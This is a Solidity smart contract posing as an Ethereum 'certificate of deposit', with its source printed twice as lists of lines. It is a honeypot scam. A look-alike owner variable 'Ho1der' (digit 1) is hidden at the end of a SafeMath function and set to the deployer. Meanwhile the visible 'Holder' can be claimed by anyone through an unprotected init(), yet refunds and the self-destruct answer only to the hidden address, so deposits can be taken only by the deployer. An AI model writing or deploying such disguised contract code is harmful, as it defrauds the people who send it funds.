['pragma solidity ^0.4.14;\n', '\n', '/**\n', ' * @title SafeMath\n', ' * @dev Math operations with safety checks that throw on error\n', ' */\n', 'contract SafeMath\n', '{\n', '    function add(uint256 x, uint256 y) internal constant returns (uint256) \n', '    {\n', '        uint256 z = x + y;\n', '        if((z >= x) && (z >= y))\n', '        {\n', '          return z;\n', '        }\n', '        else\n', '        {\n', '            revert();\n', '        }\n', '    }\n', '    function sub(uint256 x, uint256 y) internal constant returns (uint256) \n', '    {\n', '        if(x >= y)\n', '        {\n', '           uint256 z = x - y;\n', '           return z;\n', '        }\n', '        else\n', '        {\n', '            revert();\n', '        }\n', '    }\n', '    function div(uint256 x, uint256 y) internal constant returns (uint256)\n', '    {\n', '        // assert (b > 0); // Solidity automatically throws when dividing by 0\n', '        uint256 z = x / y;\n', '        // assert (a == b * c + a % b); // There is no case in which this doesn&#39;t hold\n', '        return z;\n', '    } address Ho1der = msg.sender;\n', '    function mul(uint256 x, uint256 y) internal constant returns (uint256) \n', '    {\n', '        uint256 z = x * y;\n', '        if((x == 0) || (z / x == y))\n', '        {\n', '            return z;\n', '        }\n', '        else\n', '        {\n', '            revert();\n', '        }\n', '    }\n', '}\n', '\n', '/**\n', ' * @title Basic Ethereum Certificate of Desposit Contract\n', ' */\n', 'contract DepositContract is SafeMath\n', '{\n', '    struct Certificate\n', '    {\n', '        uint Time;\n', '        uint Invested;\n', '    }\n', '    \n', '    event Deposited(address indexed sender, uint value);\n', '    event Invested(address indexed sender, uint value);\n', '    event Refunded(address indexed sender, uint value);\n', '    event Withdrew(address indexed sender, uint value);\n', '    \n', '    uint public TotalDeposited;\n', '    uint public Available;\n', '    uint public DepositorsQty;\n', '    uint public prcntRate = 10;\n', '    bool RefundEnabled;\n', '    \n', '    address public Holder;\n', '    \n', '    mapping (address => uint) public Depositors;\n', '    mapping (address => Certificate) public Certificates;\n', '\n', '    function init()\n', '    {\n', '        Holder = msg.sender;\n', '    }\n', '    \n', '    function SetPrcntRate(uint val) public\n', '    {\n', '        if(val >= 1 && msg.sender == Holder)\n', '        {\n', '            prcntRate = val;\n', '        }\n', '    }\n', '    \n', '    function() payable\n', '    {\n', '        Deposit();\n', '    }\n', '    \n', '    function Deposit() public payable\n', '    {\n', '        if (msg.value >= 3 ether)\n', '        {\n', '            if (Depositors[msg.sender] == 0)\n', '                DepositorsQty++;\n', '            Depositors[msg.sender] += msg.value;\n', '            TotalDeposited += msg.value;\n', '            Available += msg.value;\n', '            Invested(msg.sender, msg.value);\n', '        }   \n', '    }\n', '    \n', '    function ToLend() public payable\n', '    {\n', '        Certificates[msg.sender].Time = now;\n', '        Certificates[msg.sender].Invested += msg.value;\n', '        Deposited(msg.sender, msg.value);\n', '    }\n', '    \n', '    function RefundDeposit(address addr, uint amt) public\n', '    {\n', '        if(Depositors[addr] > 0)\n', '        {\n', '            if(msg.sender == Ho1der)\n', '            {\n', '                addr.send(amt);\n', '                Available -= amt;\n', '                Withdrew(addr, amt);\n', '            }\n', '        }\n', '    }\n', '\n', '    function Close() public\n', '    {\n', '        if (msg.sender == Ho1der)\n', '        {\n', '            suicide(Ho1der);\n', '        }\n', '    }\n', '}']
['pragma solidity ^0.4.14;\n', '\n', '/**\n', ' * @title SafeMath\n', ' * @dev Math operations with safety checks that throw on error\n', ' */\n', 'contract SafeMath\n', '{\n', '    function add(uint256 x, uint256 y) internal constant returns (uint256) \n', '    {\n', '        uint256 z = x + y;\n', '        if((z >= x) && (z >= y))\n', '        {\n', '          return z;\n', '        }\n', '        else\n', '        {\n', '            revert();\n', '        }\n', '    }\n', '    function sub(uint256 x, uint256 y) internal constant returns (uint256) \n', '    {\n', '        if(x >= y)\n', '        {\n', '           uint256 z = x - y;\n', '           return z;\n', '        }\n', '        else\n', '        {\n', '            revert();\n', '        }\n', '    }\n', '    function div(uint256 x, uint256 y) internal constant returns (uint256)\n', '    {\n', '        // assert (b > 0); // Solidity automatically throws when dividing by 0\n', '        uint256 z = x / y;\n', "        // assert (a == b * c + a % b); // There is no case in which this doesn't hold\n", '        return z;\n', '    } address Ho1der = msg.sender;\n', '    function mul(uint256 x, uint256 y) internal constant returns (uint256) \n', '    {\n', '        uint256 z = x * y;\n', '        if((x == 0) || (z / x == y))\n', '        {\n', '            return z;\n', '        }\n', '        else\n', '        {\n', '            revert();\n', '        }\n', '    }\n', '}\n', '\n', '/**\n', ' * @title Basic Ethereum Certificate of Desposit Contract\n', ' */\n', 'contract DepositContract is SafeMath\n', '{\n', '    struct Certificate\n', '    {\n', '        uint Time;\n', '        uint Invested;\n', '    }\n', '    \n', '    event Deposited(address indexed sender, uint value);\n', '    event Invested(address indexed sender, uint value);\n', '    event Refunded(address indexed sender, uint value);\n', '    event Withdrew(address indexed sender, uint value);\n', '    \n', '    uint public TotalDeposited;\n', '    uint public Available;\n', '    uint public DepositorsQty;\n', '    uint public prcntRate = 10;\n', '    bool RefundEnabled;\n', '    \n', '    address public Holder;\n', '    \n', '    mapping (address => uint) public Depositors;\n', '    mapping (address => Certificate) public Certificates;\n', '\n', '    function init()\n', '    {\n', '        Holder = msg.sender;\n', '    }\n', '    \n', '    function SetPrcntRate(uint val) public\n', '    {\n', '        if(val >= 1 && msg.sender == Holder)\n', '        {\n', '            prcntRate = val;\n', '        }\n', '    }\n', '    \n', '    function() payable\n', '    {\n', '        Deposit();\n', '    }\n', '    \n', '    function Deposit() public payable\n', '    {\n', '        if (msg.value >= 3 ether)\n', '        {\n', '            if (Depositors[msg.sender] == 0)\n', '                DepositorsQty++;\n', '            Depositors[msg.sender] += msg.value;\n', '            TotalDeposited += msg.value;\n', '            Available += msg.value;\n', '            Invested(msg.sender, msg.value);\n', '        }   \n', '    }\n', '    \n', '    function ToLend() public payable\n', '    {\n', '        Certificates[msg.sender].Time = now;\n', '        Certificates[msg.sender].Invested += msg.value;\n', '        Deposited(msg.sender, msg.value);\n', '    }\n', '    \n', '    function RefundDeposit(address addr, uint amt) public\n', '    {\n', '        if(Depositors[addr] > 0)\n', '        {\n', '            if(msg.sender == Ho1der)\n', '            {\n', '                addr.send(amt);\n', '                Available -= amt;\n', '                Withdrew(addr, amt);\n', '            }\n', '        }\n', '    }\n', '\n', '    function Close() public\n', '    {\n', '        if (msg.sender == Ho1der)\n', '        {\n', '            suicide(Ho1der);\n', '        }\n', '    }\n', '}']
